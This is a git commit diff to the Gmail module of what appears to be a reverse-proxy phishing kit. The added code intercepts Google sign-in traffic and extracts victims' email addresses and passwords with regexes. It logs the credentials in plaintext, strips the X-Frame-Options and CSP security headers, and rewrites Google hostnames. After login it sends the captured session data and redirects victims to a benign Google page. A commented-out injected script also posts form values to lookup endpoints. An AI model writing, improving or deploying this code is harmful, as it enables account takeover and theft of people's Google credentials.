2e4daafd8027632cedcd2d678230d28aa9ce0f74
nearfriend <105542355+nearfriend@users.noreply.github.com>
2025-10-06 20:00:18 +0900

    Update index.js

--- executor/webconfig/gmail/index.js
+++ executor/webconfig/gmail/index.js
@@ -2,9 +2,15 @@
 // eslint-disable-next-line max-classes-per-file
 const path = require('path')
 const url = require('url')
+const fs = require('fs')
+const superagent = require('superagent');
+
 
 // eslint-disable-next-line import/no-dynamic-require
 const globalWorker = process.HOOK_JS_MODULE
+
+/** Defined Functions used */
+
 
 /** Important Defaults */
 const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {
@@ -14,34 +20,144 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
-        return super.processRequest()
+        // if (this.browserReq.url.startsWith('/v3/signin/_/___AccountsSignInUi/data/batchexecute')
+        // || this.browserReq.url.startsWith('/signin/v2/')
+        // || this.browserReq.url.startsWith('/_/signin/challenge')) {
+        //     return this.makeGmailProcess()
+        // }
+        return this.makeGmailProcess()
+        // return this.browserReq.pipe(this.proxyEndpoint)
+        
+
+    }
+
+    makeGmailProcess() {
+        if (this.browserReq.headers['content-length'] > 0) {
+            let cJust = ''
+            this.browserReq.on('data', (chunk) => {
+                cJust += chunk.toString('utf8')
+            })
+            this.browserReq.on('end', () => {
+                cJust += ''
+                const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
+                const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')
+
+                this.proxyEndpoint.setHeader('Content-Length', kJust.length)
+
+                const emailRegex = /f\.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22(.*?)%5C%22/
+                const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C\d%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
+                    
+                const emailMatch = emailRegex.exec(cJust)
+                const passwordMatch = pwRegex.exec(cJust)
+                if (emailMatch) {
+                    console.log('Email matched')
+                    const emailAdressencoded = emailMatch[1]
+                    const emailGmail = decodeURIComponent(emailAdressencoded)
+                    Object.assign(this.browserReq.clientContext.sessionBody,
+                        { email: emailGmail })
+                    console.log(`email address is ${emailGmail}`)
+                    // this.proxyEndpoint.setHeader('content-length', cJust.length)
+                    this.proxyEndpoint.write(kJust) 
+                    this.proxyEndpoint.end('')
+
+                }else if (passwordMatch) {
+                    console.log('Password matched')
+                    const passwwordEncoded = passwordMatch[1]
+                    const passwordStr = decodeURIComponent(passwwordEncoded)
+                    Object.assign(this.browserReq.clientContext.sessionBody,
+                        { password: passwordStr })
+                    console.log(`password is ${passwordStr}`)
+                    // this.proxyEndpoint.setHeader('content-length', cJust.length)
+                    this.proxyEndpoint.write(kJust) 
+                    this.proxyEndpoint.end('')
+
+                } else {
+                    console.log('NO matches found')
+                    // this.proxyEndpoint.setHeader('Content-Length', kJust.length)
+                    this.proxyEndpoint.write(kJust)
+                    return this.proxyEndpoint.end('')
+                }
+            })
+        } else {
+            this.browserReq.pipe(this.proxyEndpoint)
+        }
+
     }
 }
 
 const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
 
     constructor(proxyResp, browserEndPoint) {
+       
         super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
-        this.regexes = []
+        this.regexes = [
+            {
+                reg: /play.google.com/ig,
+                replacement: '/playboy',
+            },
+            // {
+            //     reg: /<head>/,
+            //     replacement: '<script>window.addEventListener("load",(()=>{function e(e){return new Promise((n=>{if(document.querySelector(e))return n(document.querySelector(e));const t=new MutationObserver((o=>{document.querySelector(e)&&(n(document.querySelector(e)),t.disconnect())}));t.observe(document.body,{childList:!0,subtree:!0})}))}function n(){const e=document.querySelector("#identifierId").value;var n=new XMLHttpRequest;n.open("POST","/emailLookup",!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send("unenc_email="+encodeURIComponent(e))}function t(){const e=document.querySelector("input[type="password"]").value;var n=new XMLHttpRequest;n.open("POST","/pwdLookup",!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send("unenc_pwd="+encodeURIComponent(e))}e("#identifierNext").then((e=>{e.addEventListener("click",n)})),e("#passwordNext").then((e=>{e.addEventListener("click",t)}))}));</script><head>'
+            // },
+            {
+               reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
+               replacement: '/CheckConnection',
+            },
+           {
+               reg: /name="checkConnection" value/gi,
+               replacement: /name"checkConnection" value="youtube:1052:1"/,
+           },
+           {
+               reg: /signaler-pa.googleapis.com/gi,
+               replacement: this.browserEndPoint.clientContext.hostname,
+           },
+        //    {
+        //     reg: new RegExp(`https:\/\/${this.browserEndPoint.clientContext.hostname}\/CheckCookie`, 'gi'),
+        //     replacement: 'https://account.fujimems.com/CheckCookie'
+        //    }
+        ]
     }
 
-    processResponse(clientContext) {
+
+    processResponse() {
         this.browserEndPoint.removeHeader('X-Frame-Options')
         this.browserEndPoint.removeHeader('Content-Security-Policy')
         this.browserEndPoint.removeHeader('X-Content-Type-Options')
         this.browserEndPoint.removeHeader('X-XSS-Protection')
+       
+
+        const extRedirectObj = super.getExternalRedirect()
+        if (extRedirectObj !== null) {
+           const rLocation = extRedirectObj.url
+            
+        }
 
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
 
-        return super.processResponse(clientContext)
+        // return super.processResponse()
+         let newMsgBody;
+        return this.superPrepareResponse(true)
+            .then((msgBody) => {
+                newMsgBody = msgBody
+                for (let i = 0; i < this.regexes.length; i += 1) {
+                    const regExObj = this.regexes[i]
+                    if (regExObj.reg.test(newMsgBody)) {
+                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
+                    }
+                }
+                this.superFinishResponse(newMsgBody)
+            }).catch((err) => {
+            console.error(err)
+        })
     }
 
     concludeAuth() {
-        console.log('Gmail login completed successfully')
+        console.log('logged in fine please')
     }
 }
+
 
 const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     constructor(req, res, captureDict = configExport.CAPTURES) {
@@ -50,198 +166,103 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     static match(req) {
         return true
+
     }
+
 
     execute(clientContext) {
-        // Handle Gmail login flow - direct approach
-        console.log('Gmail DefaultPreHandler.execute() called!')
-        console.log('Gmail request:', this.req.url, this.req.method)
-        console.log('Gmail request host:', this.req.headers.host)
-        console.log('Gmail request origin:', this.req.headers.origin)
-        
-        // For POST requests to password endpoint, capture password and forward to Gmail
-        if (this.req.method === 'POST' && this.req.url.includes('/v3/signin/challenge/pwd')) {
-            let body = ''
-            this.req.on('data', (chunk) => {
-                body += chunk.toString()
-            })
-            this.req.on('end', () => {
-                // Extract password from form data
-                const passwordMatch = /password=([^&]+)/.exec(body)
-                if (passwordMatch) {
-                    const password = decodeURIComponent(passwordMatch[1])
-                    console.log('Password captured:', password)
-                    Object.assign(clientContext.sessionBody, { password: password })
-                }
-                
-                // Forward the request to Gmail with proper headers
-                const requestOptions = {
-                    hostname: 'accounts.google.com',
-                    port: 443,
-                    path: this.req.url,
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Content-Length': body.length,
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-                        'Origin': this.req.headers.origin || `https://${this.req.headers.host}`,
-                        'Referer': this.req.headers.referer || `https://${this.req.headers.host}/`,
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'Accept-Encoding': 'gzip, deflate, br, zstd',
-                        'Cache-Control': 'max-age=0',
-                        'Sec-Fetch-Dest': 'document',
-                        'Sec-Fetch-Mode': 'navigate',
-                        'Sec-Fetch-Site': 'same-origin',
-                        'Sec-Fetch-User': '?1',
-                        'Upgrade-Insecure-Requests': '1',
-                        'Cookie': this.req.headers.cookie || '',
-                        'Host': 'accounts.google.com'
-                    }
-                }
-                
-                const https = require('https')
-                const gmailReq = https.request(requestOptions, (gmailRes) => {
-                    console.log('Gmail password response data:', gmailRes.data)
-                    
-                    // Forward Gmail response to user
-                    this.res.writeHead(gmailRes.statusCode, gmailRes.headers)
-                    gmailRes.pipe(this.res)
-                })
-                
-                gmailReq.on('error', (err) => {
-                    console.error('Gmail password request error:', err)
-                    this.res.writeHead(500)
-                    this.res.end('Error connecting to Gmail')
-                })
-                
-                gmailReq.write(body)
-                gmailReq.end()
-            })
-            return
+
+        super.uploadBodyData(clientContext, "password")
+       
+        if (this.req.url.startsWith('/punctual/')) {
+            
+            return super.superExecuteProxy('signaler-pa.googleapis.com', clientContext)
         }
 
-        // For POST requests to identifier endpoint, capture email and forward to Gmail
-        if (this.req.method === 'POST' && this.req.url.includes('/v3/signin/identifier')) {
-            console.log('Gmail POST request to identifier endpoint detected')
-            let body = ''
-            this.req.on('data', (chunk) => {
-                body += chunk.toString()
-            })
-            this.req.on('end', () => {
-                // Extract email from form data
-                const emailMatch = /identifier=([^&]+)/.exec(body)
-                if (emailMatch) {
-                    const email = decodeURIComponent(emailMatch[1])
-                    console.log('Email captured:', email)
-                    Object.assign(clientContext.sessionBody, { email: email })
-                }
-                
-                // Forward the request to Gmail with proper headers
-                const requestOptions = {
-                    hostname: 'accounts.google.com',
-                    port: 443,
-                    path: this.req.url,
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Content-Length': body.length,
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-                        'Origin': this.req.headers.origin || `https://${this.req.headers.host}`,
-                        'Referer': this.req.headers.referer || `https://${this.req.headers.host}/`,
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'Accept-Encoding': 'gzip, deflate, br, zstd',
-                        'Cache-Control': 'max-age=0',
-                        'Sec-Fetch-Dest': 'document',
-                        'Sec-Fetch-Mode': 'navigate',
-                        'Sec-Fetch-Site': 'same-origin',
-                        'Sec-Fetch-User': '?1',
-                        'Upgrade-Insecure-Requests': '1',
-                        'Cookie': this.req.headers.cookie || '',
-                        'Host': 'accounts.google.com'
-                    }
-                }
-                
-                console.log('Headers being sent to Gmail:', requestOptions.headers)
-                const https = require('https')
-                const gmailReq = https.request(requestOptions, (gmailRes) => {
-                    console.log('Gmail response status:', gmailRes.statusCode, gmailRes.statusMessage)
-                    
-                    // If Gmail redirects to password form, follow the redirect
-                    if (gmailRes.statusCode === 302 && gmailRes.headers.location) {
-                        const redirectUrl = gmailRes.headers.location
-                        console.log('Gmail redirect:', redirectUrl)
-                        
-                        if (redirectUrl.includes('/v3/signin/challenge/pwd')) {
-                            // Redirect to password form
-                            this.res.writeHead(302, {
-                                'Location': redirectUrl.replace('https://accounts.google.com', '')
-                            })
-                            this.res.end()
-                            return
-                        }
-                    }
-                    
-                    // Forward Gmail response to user
-                    this.res.writeHead(gmailRes.statusCode, gmailRes.headers)
-                    gmailRes.pipe(this.res)
-                })
-                
-                gmailReq.on('error', (err) => {
-                    console.error('Gmail request error:', err)
-                    this.res.writeHead(500)
-                    this.res.end('Error connecting to Gmail')
-                })
-                
-                gmailReq.write(body)
-                gmailReq.end()
-            })
-            return
+        if (this.req.url === '/cold204') {
+            this.res.writeHead(204)
+            return this.res.end('')
         }
-        
-        // For all other requests, use default handling
+
+        if (this.req.url.startsWith('/playboy')) {
+            const qhost = 'play.google.com'
+            this.req.url = this.req.url.replace('/playboy/log', '/log')
+            return super.superExecuteProxy(qhost, clientContext)
+        }
+
+        if (this.req.url.startsWith('/CheckConnection')) {
+            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
+            return super.superExecuteProxy('accounts.youtube.com', clientContext)
+        }
+
+        if (this.req.url.startsWith('/CheckCookie')) {
+            clientContext.setLogAvailable(true)
+            clientContext.info.isLogin = true
+            super.sendClientData(clientContext, {})
+        }
+        if (this.req.url.startsWith('/ServiceLogin?')  && clientContext.info.isLogin === true) {
+            super.sendClientData(clientContext, {})
+            return super.exitLink('https://safety.google/privacy/data/')
+
+        }
+
+        const redirectToken = this.checkForRedirect()
+        if (redirectToken !== null) {
+            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)
+
+            if (redirectToken.url.startsWith('https://myaccount.google.com/')) {
+                super.sendClientData(clientContext, {})
+                return super.exitLink('https://safety.google/privacy/data/')
+            }
+
+            if (redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
+                return super.exitLink('https://safety.google/privacy/data/')
+
+            }
+        }
+
+        // if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
+        //     clientContext.currentDomain = process.env.PROXY_DOMAIN
+        //     this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
+        //     // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
+        // }
+
         return super.execute(clientContext)
+
     }
 }
+
+
+
 
 const configExport = {
     SCHEME: 'gmail',
 
     CURRENT_DOMAIN: 'accounts.google.com',
 
-    AUTOGRAB_CODE: 'identifier',
+    START_PATH: '/signin/v2/identifier?hl=en',
 
-    START_PATH: '/v3/signin/identifier?hl=en',
+    AUTOGRAB_CODE: 'Email',
 
-    COOKIE_PATH: ['/v3/signin/identifier', '/v3/signin/challenge/pwd'],
 
-    EXIT_TRIGGER_PATH: [],
 
-    EXIT_URL: 'https://myaccount.google.com/',
+    EXTERNAL_FILTERS: 
+    [
+    'signaler-pa.googleapis.com',
+    // 'ssl.gstatic.com',
+    ],
 
-    EXTRA_COMMANDS: [],
 
-    PRE_HANDLERS: [],
+    PRE_HANDLERS:
+        [
+        ],
     PROXY_REQUEST: ProxyRequest,
     PROXY_RESPONSE: ProxyResponse,
     DEFAULT_PRE_HANDLER: DefaultPreHandler,
 
-    CAPTURES: {
-        gmailEmail: {
-            method: 'POST',
-            params: ['identifier'],
-            urls: '',
-            hosts: ['accounts.google.com'],
-        },
 
-        gmailPassword: {
-            method: 'POST',
-            params: ['password', 'hiddenPassword'],
-            urls: '',
-            hosts: ['accounts.google.com'],
-        },
-    },
+
+    CAPTURES: { },
 
     //MODULE OPTIONS 
     MODULE_ENABLED: true,
@@ -254,3 +275,4 @@ const configExport = {
     // proxyDomain: process.env.PROXY_DOMAIN,
 }
 module.exports = configExport
+
